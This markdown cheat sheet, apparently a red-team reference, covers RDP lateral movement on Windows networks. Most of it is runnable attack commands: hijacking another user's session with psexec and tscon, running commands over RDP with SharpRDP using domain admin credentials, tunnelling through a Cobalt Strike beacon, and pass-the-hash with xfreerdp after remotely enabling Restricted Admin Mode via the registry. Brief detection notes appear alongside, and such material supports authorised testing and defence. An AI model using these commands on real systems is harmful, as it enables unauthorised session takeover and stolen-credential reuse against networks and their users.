# RDP Lateral Movement

## RDP Hijacking with tscon (T1021.001)
- Requires SYSTEM privileges; no password needed
```cmd
# Elevate to SYSTEM
psexec -s cmd
# List sessions
query user
# Hijack session (ID=2) to current console
tscon 2 /dest:console
```
- Reconnects to target user's desktop without password prompt
- Detection: tscon.exe run as SYSTEM, events 4778/4779

## Headless RDP with SharpRDP
```cmd
SharpRDP.exe computername=TARGET command=calc username=DOMAIN\admin password=pass
```
- Executes commands via RDP without GUI session
- Detection: mstscax.dll loaded by unusual binaries, connections to port 3389

## Cobalt Strike: Beacon to RDP
- Use socks proxy + rdesktop/xfreerdp through beacon tunnel
- Or use SharpRDP through execute-assembly

## Pass-the-Hash RDP
```bash
# xfreerdp with NTLM hash (Restricted Admin Mode must be enabled on target)
xfreerdp /v:TARGET /u:admin /pth:NTLM_HASH /d:DOMAIN

# Enable Restricted Admin Mode remotely (requires admin access)
reg add "\\TARGET\HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```
- Restricted Admin Mode allows pass-the-hash without knowing the plaintext password
- `mstsc /restrictedadmin` from Windows GUI also uses this mode

## Notes
- RDP creates detailed logon event trails (4624 type 10)
- NLA (Network Level Authentication) adds pre-auth barrier
- RDP hijacking bypasses NLA since session already authenticated
- Pass-the-hash RDP requires Restricted Admin Mode enabled on the target
